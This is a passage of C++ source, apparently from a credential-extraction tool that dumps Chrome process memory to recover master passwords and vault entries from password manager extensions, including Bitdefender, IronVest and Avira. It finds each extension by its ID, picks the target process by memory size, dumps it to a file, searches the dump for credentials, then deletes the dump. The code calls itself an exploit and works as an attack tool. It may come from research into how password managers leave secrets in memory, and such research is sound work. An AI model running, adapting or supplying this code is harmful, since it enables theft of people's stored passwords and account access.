        std::cout << "In this browser plugin, the first largest process is needed to find the master password.\n";
        std::cout << "The second largest process is needed to find an single entry, but it is not being checked.\n";
        std::cout << "This works when the browser makes an interaction with a login form that has an entry.\n";
        std::cout << "If the tab is closed, nothing will be in the memory.\n";
        std::cout << "Only the master password remains in this process for approx. 5 min.\n";
        std::cout << "For now, this only works with Chrome.\n";
        const char* processName = "chrome.exe";

        wchar_t username[256];
        DWORD usernameSize = sizeof(username) / sizeof(username[0]);

        if (GetUserNameW(username, &usernameSize)) {
            // Replace this value with the extension name you want to check
            std::wstring extensionName = L"ibkoenhablealnikeefmjineccmgegmh";

            if (findPlugin(username, extensionName)) {
                std::wcout << L"Directory exists!" << std::endl;
            }
            else {
                std::wcout << L"Directory does not exist." << std::endl;
                std::wcout << L"Stop execution.\n" << std::endl;
                return 1;
            }
        }
        else {
            std::wcerr << L"Failed to get the current user's login name." << std::endl;
            return 1;
        }

        // Step 1: Find PIDs by process name
        std::vector<DWORD> pids;

        if (mode == "fast") {
            pids = FindPIDsByProcessName(processName);

            if (!pids.empty())
            {
                // Step 2: Get Private Working Set sizes for the found PIDs
                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                // Step 3: Find the PID with the first-largest Private Working Set size
                DWORD firstLargestPID = FindFirstPID(pidSizePairs);

                if (firstLargestPID != 0)
                {
                    // Step 4: Create a dump file for the process with the first-largest size
                    saveDump(firstLargestPID);
                }
                else
                {
                    std::cerr << "No process with the first-largest Private Working Set size found." << std::endl;
                }
            }
            else
            {
                std::cerr << "No processes with the specified name found." << std::endl;
            }
            fileInput = "app.dmp";
        }

        if (mode == "full") {
            pids = FindPIDsByProcessName(processName);

            for (DWORD pid : pids) {
                std::wcout << L"Process PID: " << pid << std::endl;
                createFileFromMultiPIDs(pid);
            }

            fileInput = "app.dmp";
        }

        std::cout << "Searching for master pass (1/2).\n";
        getCredsbitdefender(fileInput);
        std::cout << "Done!\n";
        std::cout << "Searching for master pass (2/2).\n";
        getCredsbitdefender2(fileInput);
        std::cout << "Done!\n";
        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
    }

    //ironvest plugin chrome
    //only browser plugin is available
    //Did not check with Firefox
    if (userInput == "ironvest") {
        std::cout << "User input matches 'ironvest'.\n";
        std::cout << "In this browser plugin, the fourth largest process is needed.\n";
        std::cout << "This works when the browser has the ironvest webapp open.\n";
        std::cout << "Only entries remains in this process.\n";
        std::cout << "For now, this only works with Chrome.\n";
        const char* processName = "chrome.exe";

        wchar_t username[256];
        DWORD usernameSize = sizeof(username) / sizeof(username[0]);

        if (GetUserNameW(username, &usernameSize)) {
            // Replace this value with the extension name you want to check
            std::wstring extensionName = L"epanfjkfahimkgomnigadpkobaefekcd";

            if (findPlugin(username, extensionName)) {
                std::wcout << L"Directory exists!" << std::endl;
            }
            else {
                std::wcout << L"Directory does not exist." << std::endl;
                std::wcout << L"Stop execution.\n" << std::endl;
                return 1;
            }
        }
        else {
            std::wcerr << L"Failed to get the current user's login name." << std::endl;
            return 1;
        }

     
        // Step 1: Find PIDs by process name
        std::vector<DWORD> pids;

        if (mode == "fast") {

            pids = FindPIDsByProcessName(processName);

            if (!pids.empty())
            {
                // Step 2: Get Private Working Set sizes for the found PIDs
                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                // Step 3: Find the PID with the fourth-largest Private Working Set size
                DWORD fourthLargestPID = FindFourthPID(pidSizePairs);

                if (fourthLargestPID != 0)
                {
                    // Step 4: Create a dump file for the process with the fourth-largest size
                    saveDump(fourthLargestPID);
                }
                else
                {
                    std::cerr << "No process with the fourth-largest Private Working Set size found." << std::endl;
                }
            }
            else
            {
                std::cerr << "No processes with the specified name found." << std::endl;
            }
            fileInput = "app.dmp";
        }

        if (mode == "full") {
            pids = FindPIDsByProcessName(processName);

            for (DWORD pid : pids) {
                std::wcout << L"Process PID: " << pid << std::endl;
                createFileFromMultiPIDs(pid);
            }

            fileInput = "app.dmp";
        }

        std::cout << "Searching for entries.\n";
        getCredsironvest(fileInput);
        std::cout << "Done!\n";
        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
    }


    //avira plugin chrome
    //only browser plugin is available
    //Did not check with Firefox
    if (userInput == "avira") {
        std::cout << "User input matches 'avira'.\n";
        std::cout << "In this browser plugin, the second largest process is needed.\n";
        std::cout << "This works by simply having the browser open. No interaction is needed.\n";
        std::cout << "To speed up the process, visit a login form. After 1 min the credentials should be in the memory.\n";
        std::cout << "Only entries remains in this process.\n";
        std::cout << "The exploit was tested with 3 entries. In case the user has more entries, the relevant value (600) should be change in the exploit.\n";
        std::cout << "A hard guess is that approx 200 bytes will be needed per entry.\n";
        std::cout << "For now, this only works with Chrome.\n";
        const char* processName = "chrome.exe";

        wchar_t username[256];
        DWORD usernameSize = sizeof(username) / sizeof(username[0]);

        if (GetUserNameW(username, &usernameSize)) {
            // Replace this value with the extension name you want to check
            std::wstring extensionName = L"caljgklbbfbcjjanaijlacgncafpegll";

            if (findPlugin(username, extensionName)) {
                std::wcout << L"Directory exists!" << std::endl;
            }
            else {
                std::wcout << L"Directory does not exist." << std::endl;
                std::wcout << L"Stop execution.\n" << std::endl;
                return 1;
            }
        }
        else {
            std::wcerr << L"Failed to get the current user's login name." << std::endl;
            return 1;
        }

        // Step 1: Find PIDs by process name
        std::vector<DWORD> pids;

        if (mode == "fast") {
            pids = FindPIDsByProcessName(processName);

            if (!pids.empty())
            {
                // Step 2: Get Private Working Set sizes for the found PIDs
                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                // Step 3: Find the PID with the second-largest Private Working Set size
                DWORD secondLargestPID = FindSecondPID(pidSizePairs);

                if (secondLargestPID != 0)
                {
                    // Step 4: Create a dump file for the process with the second-largest size
                    saveDump(secondLargestPID);
                }
                else
                {
                    std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
                }
            }
            else
            {
                std::cerr << "No processes with the specified name found." << std::endl;
            }
            fileInput = "app.dmp";
        }

        if (mode == "full") {
            pids = FindPIDsByProcessName(processName);

            for (DWORD pid : pids) {
                std::wcout << L"Process PID: " << pid << std::endl;
                createFileFromMultiPIDs(pid);
            }

            fileInput = "app.dmp";
        }

        std::cout << "Searching for entries (1/2).\n";
        getCredsavira(fileInput);
        std::cout << "Done!\n";
        std::cout << "Searching for entries (2/2).\n";
        getCredsavira2(fileInput);
        std::cout << "Done!\n";
        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
    }


    //Just to be sure
    if (userInput != "1password" && userInput != "firefox" && userInput != "dashlane"
        && userInput != "keeper" && userInput != "chrome" && userInput != "brave"
        && userInput != "msedge" && userInput != "lastpass" && userInput != "roboform"
        && userInput != "bitwarden" && userInput != "norton" && userInput != "bitdefender"
        && userInput != "ironvest" && userInput != "passwarden" && userInput != "avira"
        && userInput != "passwordboss") {
        std::cout << "User input did not match a specific password manager.\n";
        std::cout << "The input must be case-sensitive.\n";
        return 1;
    }

    //Delete it
    remove("app.dmp");

    std::cout << "File 'app.dmp' was deleted.\n";
}
